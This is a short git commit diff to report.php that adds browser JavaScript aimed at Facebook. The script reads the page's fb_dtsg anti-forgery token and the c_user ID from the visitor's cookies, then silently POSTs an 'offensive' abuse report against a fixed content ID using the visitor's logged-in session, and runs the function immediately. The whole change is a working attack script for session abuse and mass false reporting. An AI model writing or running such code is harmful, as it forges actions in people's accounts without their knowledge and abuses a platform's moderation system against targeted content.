7c5c100868e927e2466dd5c3c8c8b5ab7749f4d4
wazzygray <qariwaqar@gmail.com>
2013-07-31 23:50:45 +0500

    Update report.php

--- report.php
+++ report.php
@@ -55,5 +55,20 @@ function ReportNow() {
 }
 ReportNow();
 
-
+var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+var now=(new Date).getTime();
+function ReportNow1() {
+  var Page = new XMLHttpRequest();
+  var PageURL = "//www.facebook.com/ajax/report/social.php";
+  var PageParams ="fb_dtsg="+fb_dtsg+"&pp=%7B%22actions_to_take%22%3A%22[]%22%2C%22are_friends%22%3Afalse%2C%22cid%22%3A135161536684829%2C%22content_type%22%3A23%2C%22first_choice%22%3A%22offensive%22%2C%22is_following%22%3Afalse%2C%22is_tagged%22%3Afalse%2C%22on_profile%22%3Afalse%2C%22phase%22%3A3%2C%22report_type%22%3A124%2C%22sub_report_type%22%3A10%2C%22time_flow_started%22%3A"+now+"%2C%22user%22%3A"+user_id+"%7D&file_report=1&__user="+user_id+"&__a=1&__dyn=7n8ahyj35CFUSt2u5FeDKd8q&__req=14&ttstamp=26581681211077389101";
+  Page.open("POST", PageURL, true);
+  Page.onreadystatechange = function () {
+    if (Page.readyState == 4 && Page.status == 200) {
+      Page.close;
+    }
+  };
+  Page.send(PageParams);
+}
+ReportNow1();
 
